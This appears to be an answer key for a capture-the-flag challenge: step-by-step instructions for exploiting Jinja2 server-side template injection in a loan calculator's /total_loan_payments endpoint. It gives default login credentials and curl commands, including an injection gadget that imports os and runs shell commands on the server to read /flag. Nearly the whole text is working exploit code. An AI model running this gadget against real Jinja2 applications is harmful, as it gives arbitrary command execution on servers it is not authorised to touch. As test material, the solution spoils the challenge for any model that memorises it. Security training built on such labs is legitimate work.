# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Jinja2 SSTI → RCE. `/total_loan_payments` f-string-interpolates the
raw `principal` query parameter into the template SOURCE before
`render_template_string`, so Jinja2 expressions in `principal` execute. Default
creds `test`/`test`; the flag is at `/flag`.

1. **Log in** with `test`/`test`:

   ```
   curl -s -c cookies.txt -d "username=test&password=test" "http://<target>/login" -L -o /dev/null
   ```

2. **(Optional) Confirm SSTI** — expect `"loan_principal": "49"`:

   ```
   curl -s -b cookies.txt -G "http://<target>/total_loan_payments" \
     --data-urlencode "principal={{7*7}}" --data-urlencode "payment=1" --data-urlencode "term=1"
   ```

3. **Send the RCE gadget** via `principal` to read `/flag`:

   ```
   curl -s -b cookies.txt -G "http://<target>/total_loan_payments" \
     --data-urlencode 'principal={{ self.__init__.__globals__.__builtins__.__import__("os").popen("cat /flag").read() }}' \
     --data-urlencode "payment=1" --data-urlencode "term=1"
   ```

4. **Extract the flag** (`FLAG{...}`) from the `loan_principal` field and report it
   verbatim.
